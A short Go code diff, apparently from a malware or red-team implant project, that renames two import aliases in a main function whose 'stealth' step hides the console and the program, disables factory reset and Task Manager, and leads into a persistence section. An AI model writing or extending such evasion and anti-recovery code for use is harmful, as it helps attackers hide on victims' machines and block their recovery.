@@ -24,8 +24,8 @@ import (
 	"github.com/RU7HL355/redtm/internal/core/system"
 	"github.com/RU7HL355/redtm/internal/core/vpn"
 	"github.com/RU7HL355/redtm/internal/fakerr"
-	"github.com/RU7HL355/redtm/internal/fr"
-	"github.com/RU7HL355/redtm/internal/hc"
+	factoryreset "github.com/RU7HL355/redtm/internal/fr"
+	hideconsole "github.com/RU7HL355/redtm/internal/hc"
 	"github.com/RU7HL355/redtm/internal/taskmanager"
 	"github.com/RU7HL355/redtm/internal/uac"
 	"github.com/RU7HL355/redtm/pkg/utils/common"
@@ -96,9 +96,9 @@ func main() {
 
 	// Stealth operations
 	log.Println("🕵️ Applying stealth...")
-	hc.HideConsole()
+	hideconsole.HideConsole()
 	common.HideSelf()
-	fr.Disable()
+	factoryreset.Disable()
 	taskmanager.Disable()
 
 	// Persistence
